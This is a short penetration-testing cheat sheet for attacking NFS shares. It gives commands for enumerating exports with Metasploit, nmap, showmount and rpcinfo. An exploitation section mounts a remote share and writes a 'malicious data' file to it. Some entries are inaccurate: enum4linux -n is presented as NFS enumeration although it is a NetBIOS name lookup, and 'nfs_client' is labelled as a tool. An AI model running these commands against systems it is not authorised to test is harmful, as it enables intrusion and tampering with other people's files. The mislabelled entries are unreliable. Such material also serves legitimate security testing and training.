# NFS

## Enumeration

### Metasploit

##### nfs_enum
```bash
use auxiliary/scanner/nfs/nfs_enum
set RHOSTS [IP]
set RPORT 2049
run
```

### Nmap

##### nmap (NFS service enumeration)
```bash
nmap -p 2049 --script=nfs-showmount [IP]
```

##### nmap (NFS version detection)
```bash
nmap -p 2049 --script=nfs-version [IP]
```

### showmount

##### showmount (List NFS exports)
```bash
showmount -e [IP]
```

### enum4linux

##### enum4linux (Enumerate NFS shares)
```bash
enum4linux -n [IP]
```

### rpcinfo

##### rpcinfo (Check for NFS services)
```bash
rpcinfo -p [IP]
```


---
---


## Exploitation

### Metasploit

##### nfs_mounter
```bash
use exploit/linux/nfs/nfs_mounter
set RHOSTS [IP]
set RPORT 2049
run
```

### nfs_client

##### nfs_client (Mount an NFS share)
```bash
mount -t nfs [IP]:/[exported_share] /mnt/nfs
```

##### nfs_client (Write to an NFS share)
```bash
echo "malicious data" > /mnt/nfs/attack_file
```